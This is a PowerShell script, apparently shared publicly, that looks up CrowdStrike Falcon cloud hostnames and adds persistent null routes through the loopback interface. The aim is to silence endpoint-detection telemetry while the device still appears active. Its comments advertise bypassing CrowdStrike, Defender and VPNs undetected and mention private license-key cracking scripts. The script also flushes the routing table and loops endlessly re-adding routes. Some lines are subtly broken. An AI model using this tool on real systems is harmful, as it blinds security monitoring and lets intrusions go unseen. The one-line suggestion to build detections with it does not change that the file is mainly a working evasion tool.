# This can be used to bypass Crowdstrike, Defender, And improperly configured VPNs w/o being detected.  Only downside is, you gotta be an admin!
# You'll need to add your own defender links to the target_URLs, IP Addressing blocks work suuuuper easily, and can neuter visibility such that a device reports active, but can't report timeline events or alerts.
# You'll also need to add your own addresses for other VPNs, but all-in-all it's really easy to work, and verified to work. 
# Test on your own network to build detections w/ whatever EDR toolsets you have.  Powershell vs. route methods work.

#CS IP Links https://www.dell.com/support/kbdoc/en-lv/000177899/crowdstrike-falcon-sensor-system-requirements
#CS IP Links https://github.com/simonsigre/crowdstrike_falcon-ipaddresses/blob/master/cs_falcon_commercial_cloud
# This is not illegal, I just read this: https://www.justice.gov/jm/jm-9-48000-computer-fraud, however some of my license key scripts to artificially extend/create keys will have to remain private. Sorry m8s
$target_URLs = @("ts01-gyr-maverick.cloudsink.net", "ts01-b.cloudsink.net", "lfodown01-gyr-maverick.cloudsink.net", "lfodown01-b.cloudsink.net")
$Regex_Lookups = @()#Fill this in with sites you want to block.
$IPs =@() #fill this with IPs you know you want to block.


$target_URLs | foreach-object {Invoke-WebRequest -TimeoutSec 1 -uri $_

    try{
        $datum = (get-dnsclientcache -entry $_ -ErrorAction Continue).data
    $IPs += $datum
    }
    catch{
    write-host ""
    
    }
}
Get-DNSClientcache | foreach-object{$test = $_|out-string; foreach( $thing in $Regex_Lookups) {if ($test -like "*$thing*") {IPs += $_.data}}}



$IPs

$InterfaceAlias = "*Loopback*"
route /f
# Get the loopback interface index
$InterfaceIndex = (Get-NetIPInterface | Where-Object {$_.InterfaceAlias -like $InterfaceAlias}).InterfaceIndex
while ($true){
    $IPs | ForEach-Object{
        $meesa = $_ + "/32"
        $meesa
        route add -p $_ mask 255.255.255.255 0.0.0.0 if $InterfaceIndex[0]
     }
            
}
